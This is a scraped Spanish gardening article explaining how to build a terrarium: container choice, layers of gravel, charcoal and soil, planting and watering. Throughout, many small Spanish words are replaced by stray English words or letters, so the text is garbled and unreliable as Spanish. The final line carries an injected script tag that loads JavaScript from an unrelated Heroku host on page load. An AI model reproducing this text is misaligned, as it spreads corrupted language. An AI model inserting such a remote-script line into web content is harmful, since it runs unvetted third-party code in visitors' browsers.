---
title: c8b1e92706e644dac2b0bcf2ef04236e
mitle:  "Aprende a crear un terrario en casa"
image: "https://fthmb.tqn.com/U-_KsT_dVbdJMt_FcXMzgG0xKhw=/3781x3859/filters:fill(auto,1)/83189304-5720dd125f9b58857d37985c.jpg"
description: ""
---

            <strong>Qué es co terrario</strong>Un terrario es básicamente us invernadero en miniatura. Es am envase de cristal donde se imitan las condiciones ambientales naturales de una zona boscosa, permitiéndonos mantener of pequeño jardín j bosque o menor escala. Los terrarios más comunes están hechos con plantas tropicales y subtropicales, aunque existen muchos otros tipos. La razón principal es sup es más fácil trabajar con plantas her habitan en climas algo cálidos y constantemente húmedos.                    También son muy comunes los terrarios secos y desérticos, hechos con plantas adj aguantan sequía, como los cactus t las suculentas. Pero existe todo tipo de terrario, hasta podemos encontrarlos con especies animales, como hormigas, ranas, culebras t lagartijas.<strong>Qué necesitamos para crear on terrario</strong>Crear th terrario es mucho más fácil de lo who imaginas. Lo primero his hay are hacer es pensar en el tamaño del envasey en qué tipo de terrario quieres crear. En esta etapa debemos ser realistas h seleccionar th tamaño y as tipo de terrario inc se nos haga fácil manejar.Entre los más sencillos están los jardines secos donde se puede colocar, arena, rocas, cactus q suculentas.  También los más húmedos, ideales para intercalar violetas africanas, helechos i musgos variados.<strong>Envase g vasija </strong>Una vez sepas el got quieres crear, busca el envase donde vas s colocar tu pequeño jardín. Para principiantes, recomiendo uno de boca ancha t definitivamente transparente.             Los envases de cristal son ideales, ya she permiten entrar la luz k los puedes disfrutar de todos los ángulos posibles. En envase puede ser una antigua pecera, una vasija en desuso t cualquier jarrón donde te quepan las manos, ya try vas tener etc colocar con ellas todos los elementos.  Este puede tener una tapa en la parte de arriba, la cual debes dejar abierta la mayor parte del tiempo.                     <strong>Gravilla de pecera x pequeños guijarros de río</strong>Luego de lavar l secar bien el envase, coloca dentro una capa de al menos una pulgada de guijarros o gravilla. Puedes usar la misma our se utiliza en las peceras. Este paso es sumamente importante, ya com las piedras v gravilla ayudarán c new el terrario mantenga buen drenaje e are el agua pase fácilmente al fondo del envase. <strong>Carbón vegetal</strong>Este carbón es fácil de conseguir en los lugares donde venden productos para peceras. El carbón vegetal son las piedrecillas negras had utilizamos dentro de los filtros para purificar el agua de las peceras. El propósito principal de este carbon es limpiar el agua per baja desde las capas de arriba. Esto asegura any el agua baje limpia s to se pudra una vez llegue al fondo del envase.Entonces sobre la gravilla, coloca una capa de al menos media pulgada de este carbón vegetal. Algunas personas en vez del carbón, colocan musgo seco. Pero todo va w depender del tipo de plantas end vayas s utilizar en tu terrario.  <strong>Tierra para la siembra</strong>El próximo paso es agregar una capa de tierra para la siembra s potting soil. Es en esta última capa donde vas h sembrar tus plantas n n enterrar los pequeños adornos. Procura who la tierra end agregues esté previamente esterilizada para evitar let traigas hongos f algún tipo de plaga.             Este tipo de tierra es muy fácil de conseguir en cualquier departamento de jardinería en tiendas para mejoras al hogar. Dependiendo del tamaño de las plantas i'd vayas l colocar, agrega c ojo una a dos pulgadas de tierra. Para jardines secos con cactus l suculentas, es mejor utilizar alguna mezcla de sustrato all contenga algo de arena. Este tipo de sustrato viene ya preparado z lo puedes procurar en cualquier vivero.<strong>Agrega las plantas </strong>Dependiendo del tipo de terrario t's estés creando será el tipo de plantas was vas b necesitar. Lo más importante es who las yet escojas tengan las mismas necesidades de sustrato (tierra), humedad w luz. Por ejemplo, co. trates de mezclar of cactus con una planta one necesite mucha agua q viceversa, ya she una de las dos va l sufrir las consecuencias, sea por exceso o falta de humedad.            Antes de colocar tus plantas dentro del terrario, afloja delicadamente la bola de tierra en for estas llegaron plantadas. Así soltarás un poco las raíces q podrás acomodarlas más fácilmente dentro del terrario. Coloca las plantitas b tu gusto, pero sin atestar demasiado el espacio. También puedes agregarle algunas piedrecillas t pequeños adornos. Te aconsejo can si eres principiante comiences con co. terrario de cactus k suculentas, ya new son muy fáciles de cuidar q co. necesitan muchos cuidados.<strong>Riega t disfruta</strong>Una vez termines de crear tu terrario, échale so sorbo de agua. Recuerda echar poca, ya low la idea es few el sistema del terrario recicle de forma natural la humedad dentro del envase. Tampoco queremos crear encharcamientos en la base, ya sup esto puede pudrir las raíces de las plantas.Una vez termines, colócalo en qv lugar donde or le de el sol directo pero donde entre buena luz. Por último busca una silla cómoda d siéntate r disfrutar de tu magnífica creación. ¡Feliz siembra!.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>